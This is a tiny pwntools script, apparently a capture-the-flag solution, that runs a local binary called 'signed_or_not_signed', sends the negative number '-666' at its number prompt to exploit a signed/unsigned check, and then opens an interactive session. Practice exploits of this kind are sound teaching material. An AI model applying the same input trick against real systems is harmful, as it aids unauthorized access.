from pwn import *

e = ELF('./signed_or_not_signed')
p = process('./signed_or_not_signed')

print p.recvuntil('Please give me a number:')
payload = '-666'
p.sendline(payload)
p.interactive()